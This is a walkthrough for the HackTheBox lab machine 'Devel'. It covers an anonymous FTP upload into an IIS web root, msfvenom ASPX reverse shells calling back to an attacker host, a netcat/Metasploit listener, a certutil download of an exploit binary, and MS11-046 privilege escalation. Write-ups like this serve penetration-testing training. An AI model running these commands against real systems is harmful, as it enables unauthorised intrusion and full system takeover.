# HackTheBox — Devel

**Platform:** HackTheBox  
**Difficulty:** Easy  
**OS:** Windows  
**Category:** Web Exploitation / IIS / FTP Anonymous Upload / MS11-046  
**Status:** Retired  

---

## Summary

Devel is a Windows machine running IIS with an FTP service that allows anonymous uploads directly into the web root. Uploading an ASPX reverse shell grants a low-privilege shell. Privilege escalation uses MS11-046 (afd.sys), a well-known Windows kernel vulnerability.

---

## Reconnaissance

### Nmap

```bash
nmap -sC -sV -oA nmap/devel 10.10.10.5
```

```
PORT   STATE SERVICE VERSION
21/tcp open  ftp     Microsoft ftpd
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| 03-18-17  02:06AM       <DIR>          aspnet_client
| 03-17-17  05:37PM                  689 iisstart.htm
| 03-17-17  05:37PM               184946 welcome.png
22/tcp (not shown in some scans)
80/tcp open  http    Microsoft IIS httpd 7.5
```

Anonymous FTP enabled — and it's the IIS web root!

---

## Exploitation

### Upload ASPX Web Shell via FTP

```bash
ftp 10.10.10.5
# Username: anonymous
# Password: (blank)

# Upload reverse shell
put shell.aspx
```

Generate the ASPX shell first:

```bash
msfvenom -p windows/meterpreter/reverse_tcp \
  LHOST=10.10.14.X LPORT=4444 \
  -f aspx -o shell.aspx
```

### Trigger the Shell

```bash
# Start Metasploit listener
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.14.X
set LPORT 4444
run

# Trigger via browser or curl
curl http://10.10.10.5/shell.aspx
```

Meterpreter session opens as **IIS APPPOOL\Web**.

---

## Manual Alternative (No Metasploit)

```bash
# Generate a simple shell
msfvenom -p windows/shell_reverse_tcp \
  LHOST=10.10.14.X LPORT=4444 \
  -f aspx -o cmdshell.aspx

# Listener
nc -lvnp 4444
```

---

## User Flag

```cmd
type C:\Users\babis\Desktop\user.txt
```

---

## Privilege Escalation

### System Information

```cmd
systeminfo
```

```
OS Name: Microsoft Windows 7 Enterprise
OS Version: 6.1.7600 N/A Build 7600
System Type: X86-based PC
```

Windows 7 Build 7600 — no service pack, 32-bit.

### MS11-046 — afd.sys Privilege Escalation

```bash
# Compile the exploit (if needed)
i686-w64-mingw32-gcc MS11-046.c -o MS11-046.exe -lws2_32

# Transfer to target via Meterpreter
upload MS11-046.exe C:\\Temp\\MS11-046.exe
```

Or use certutil:

```cmd
certutil -urlcache -f http://10.10.14.X:8080/MS11-046.exe C:\Temp\MS11-046.exe
```

Execute:

```cmd
C:\Temp\MS11-046.exe
```

**SYSTEM shell obtained.**

---

## Root Flag

```cmd
type C:\Users\Administrator\Desktop\root.txt
```

---

## Key Takeaways

- Anonymous FTP to the web root = immediate web shell upload capability
- ASPX shells work on IIS servers (.asp also works for older IIS)
- `systeminfo` is your first step — note the OS version, build number, and architecture
- Windows 7 SP0 build 7600 is vulnerable to numerous LPE exploits
- `certutil -urlcache -f` transfers files using built-in Windows tools (no PowerShell needed)
- 32-bit vs 64-bit matters for exploit selection — always check `System Type` in systeminfo

---

## CVE References

- **MS11-046 / CVE-2011-1249** — Windows Ancillary Function Driver (afd.sys) LPE

---

## Tools Used

| Tool | Purpose |
|------|---------|
| nmap | Port scanning |
| ftp | Anonymous file upload |
| msfvenom | ASPX shell generation |
| Metasploit / netcat | Shell handler |
| certutil | File transfer |
| MS11-046.exe | Privilege escalation |
